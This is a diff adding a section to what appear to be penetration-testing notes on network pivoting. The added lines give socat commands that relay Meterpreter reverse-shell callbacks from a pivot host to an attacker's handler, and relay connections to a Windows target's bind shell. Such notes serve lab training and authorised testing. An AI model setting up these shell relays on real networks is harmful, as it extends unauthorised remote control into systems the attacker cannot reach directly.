@@ -74,6 +74,30 @@ This makes a connection between our listening port `8001` on the attacking machi
 
 This would create a link between port `8000` on our attacking machine, and port `80` on the intended target (`172.16.0.10`), meaning that we could go to `localhost:8000` in our attacking machine's web browser to load the webpage served by the target: `172.16.0.10:80`!
 
+---
+
+### Meterpreter Reverse Shell Relay
+
+Forward Meterpreter callbacks from pivot host to attack host:
+
+```bash
+socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+```
+
+Listens on pivot host port 8080, forwards all traffic to attack host port 80 where the multi/handler is waiting.
+
+### Meterpreter Bind Shell Relay
+
+Forward connections from attack host through pivot to target bind shell:
+
+```bash
+socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+```
+
+Listens on pivot host port 8080, forwards to Windows target's bind shell on port 8443.
+
+---
+
 ### Socat Windows Relay for File Transfers
 
 When a target Windows machine cannot reach your attack box directly but can reach a pivot host, use socat on the pivot to relay HTTP traffic:
